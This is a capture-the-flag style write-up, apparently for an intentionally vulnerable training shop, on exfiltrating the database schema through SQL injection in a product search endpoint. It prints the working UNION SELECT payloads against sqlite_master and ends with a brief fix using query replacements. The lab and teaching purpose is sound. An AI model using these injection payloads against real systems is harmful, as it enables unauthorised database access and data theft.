# Database Schema

**Description**
Exfiltrate the entire DB schema definition via SQL Injection.

Topics: With Coding Challenge
Style: Injection

## Solutions

### Web Solution
First we must understand how to "view" the DB schema... I mean it's not a trivial query!!
But to understand that we must "leak" the DB type, we will start looking for `SQLi`.

Found an `SQLITE-ERROR` when sending the following requests:
```bash
GET /rest/products/search?q='--
```
Result was a JSON:
```json
{
  "error":{
    "message":"SQLITE_ERROR: incomplete input",
    "stack":"Error: SQLITE_ERROR: incomplete input",
    "errno":1,
    "code":"SQLITE_ERROR",
    "sql":"SELECT * FROM Products WHERE ((name LIKE '%'--%' OR description LIKE '%'--%') AND deletedAt IS NULL) ORDER BY name"
  }
}
```

We now the DB is of type `sqlite` meaning we know how should a "schema-leak" look like: `SELECT sql FROM sqlite_master WHERE type = 'table';`

Now we must find a way to combine both queries, we might use something called UNION!

the query I tried is:
```sql
GET /rest/products/search?q='))+UNION+SELECT+sql,NULL+FROM+sqlite_master+WHERE+type+=+'table';-- HTTP/1.1
```
Which resulted at the entire query:
```sql
SELECT * FROM Products WHERE ((name LIKE '%')) UNION SELECT sql,NULL FROM sqlite_master WHERE type = 'table';--%' OR description LIKE '%')) UNION SELECT sql,NULL FROM sqlite_master WHERE type = 'table';--%') AND deletedAt IS NULL) ORDER BY name
```

After some games, I decided to use 'NUMBER' instead of `Null`.
So I made this request: 
```sql
GET /rest/products/search?q='))+UNION+SELECT+'1','2','3','4','5','6','7','8','9'+FROM+sqlite_master+WHERE+type+=+'table';-- HTTP/1.1
```
Then I swapped `'1'` with `sql` and wolla!
```sql
GET /rest/products/search?q='))+UNION+SELECT+sql,'2','3','4','5','6','7','8','9'+FROM+sqlite_master+WHERE+type+=+'table';-- HTTP/1.1
```

Response was a long json with last elemnt of value: `CREATE TABLE sqlite_sequence(name,seq)`

Boom, challenge solved!!

### Coding Challenge

The vulnerable line is the `models.sequelize.query`, when using "format" of type `${DATA}`.
Fix should be using the `replacements` keyword!